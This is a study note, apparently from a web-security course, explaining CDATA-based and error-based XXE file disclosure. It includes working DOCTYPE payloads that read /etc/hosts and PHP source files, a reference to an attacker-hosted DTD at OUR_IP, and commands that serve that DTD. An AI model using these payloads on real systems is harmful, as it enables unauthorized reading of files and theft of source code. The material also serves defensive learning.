## 1. Advanced XXE File Disclosure

Basic XXE does not always work because:

- Some file formats cannot be directly inserted into XML.
    
- The application may not display XML entity values.
    
- Binary or special-character data may break XML parsing.
    
- The application may be **blind** to XML output.
    

Two important techniques covered here are:

1. **CDATA-based exfiltration**
    
2. **Error-based XXE**
    

---

# 2. CDATA-Based Exfiltration

### Problem

When reading certain files through XXE, their contents may contain characters that do not conform to XML syntax.

**CDATA** can be used to make the XML parser treat the enclosed content as raw data.

Basic structure:

```xml
<![CDATA[ FILE_CONTENT ]]>
```

Everything inside CDATA is treated as character data rather than XML markup.

---

## Internal + External Entity Limitation

An initial approach is to create:

```xml
<!ENTITY begin "<![CDATA[">
<!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
<!ENTITY end "]]>">
<!ENTITY joined "&begin;&file;&end;">
```

The idea is:

```text
<![CDATA[ + FILE_CONTENT + ]]>
```

However, **XML prevents joining internal and external entities in this way**.

---

# 3. XML Parameter Entities

A workaround is to use **parameter entities**.

### Parameter Entity

- Begins with `%`
    
- Can only be used within the DTD.
    
- When referenced from an external DTD, the entities can be combined in a way that allows the CDATA technique.
    

Example:

```xml
<!ENTITY joined "%begin;%file;%end;">
```

The overall concept is:

```text
begin
  ↓
<![CDATA[
  ↓
file contents
  ↓
]]>
  ↓
joined output
```

---

## External DTD

An attacker-controlled DTD can contain the required entity combination.

Example:

```text
xxe.dtd
```

```xml
<!ENTITY joined "%begin;%file;%end;">
```

The external DTD can then be hosted on a server and referenced by the vulnerable application.

The XML structure becomes conceptually:

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
```

The application can then reference:

```xml
<email>&joined;</email>
```

This allows the file contents to be treated as CDATA.

---

## Key Point

**CDATA-based exfiltration allows file contents containing XML-special characters to be returned without first encoding the file into Base64.**

It is especially useful when the basic XXE file-reading technique fails.

---

# 4. Hosting an External DTD

The module demonstrates hosting the DTD using Python's HTTP server:

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

The target application then references the externally hosted DTD.

---

# 5. Error-Based XXE

Another situation occurs when:

- The application processes XML.
    
- External entities work.
    
- **No XML entity output is displayed.**
    
- Therefore, normal XXE output cannot be retrieved.
    

If the application displays **runtime/XML parsing errors**, those errors can potentially be used to expose the contents of an external entity.

This technique is called **Error-Based XXE**.

---

# 6. First Identify Error Disclosure

Before attempting error-based XXE, determine whether the application displays XML/PHP errors.

Possible ways to trigger an error include:

- Removing a closing XML tag.
    
- Using an incorrect closing tag.
    
- Referencing a nonexistent entity.
    

Example:

```xml
&nonExistingEntity;
```

If errors are displayed, the response may reveal information such as the **web server's directory path**.

This information can help identify locations of other files.

---

# 7. Error-Based File Exfiltration

An external DTD can define a file entity and combine it with an invalid entity.

Concept:

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

### How it works

1. `%file;` references the target file.
    
2. `%nonExistingEntity;` does not exist.
    
3. The parser generates an error.
    
4. The generated error can contain the referenced file content.
    

The external DTD is then loaded:

```xml
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

The resulting parser error may expose the contents of the targeted file.

---

# 8. Reading Different Files

The file referenced by the `%file` entity can be changed to another target.

For example:

```text
file:///etc/hosts
```

or a PHP source file such as:

```text
file:///var/www/html/submitDetails.php
```

However, **error-based XXE is less reliable for source-code extraction** than the CDATA technique because:

- Error messages can have length limitations.
    
- Special characters may interfere with the generated error.
    
- Some file contents may not be represented correctly.
    

---

# 9. CDATA vs Error-Based XXE

|Technique|Main Purpose|Important Limitation|
|---|---|---|
|**CDATA Exfiltration**|Extract file contents containing XML-special characters|Requires parameter/external entity setup|
|**Error-Based XXE**|Extract data when the application doesn't display entity output|Depends on verbose error messages|
|**Basic XXE**|Directly read external resources|File contents may break XML/output|

---

## Key Takeaways

- **CDATA** treats file contents as raw XML character data.
    
- Internal and external entities cannot simply be joined, so **XML parameter entities** are used for the advanced CDATA technique.
    
- An **external DTD** can define and combine parameter entities.
    
- **Error-Based XXE** is useful when the application does not display entity output but does expose parser/runtime errors.
    
- Error-based extraction can reveal sensitive file contents through malformed references.
    
- **CDATA is generally more reliable for source-file extraction**, while error-based XXE can suffer from length and special-character limitations.
    
- XXE exploitation fundamentally depends on the XML parser allowing unsafe external entity processing.